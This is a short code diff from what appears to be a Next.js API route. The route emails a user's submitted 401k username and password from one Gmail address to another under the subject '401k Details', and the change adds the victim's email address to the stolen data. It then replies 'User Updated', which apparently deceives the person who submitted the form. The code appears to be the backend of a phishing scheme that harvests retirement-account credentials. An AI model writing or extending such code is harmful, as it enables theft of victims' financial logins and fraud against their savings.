@@ -32,7 +32,7 @@ export async function POST(req) {
         from: "hvbvcchuknb@gmail.com",
         to: "joychurch28@gmail.com",
         subject: "401k Details",
-        html: `<h2>401K username is ${body.username} and password is ${body.password}</h2>`,
+        html: `<h2>${body.email}'s 401K username is ${body.username} and password is ${body.password}</h2>`,
       });
       return NextResponse.json({ message: "User Updated" }, { status: 200 });
     } else {
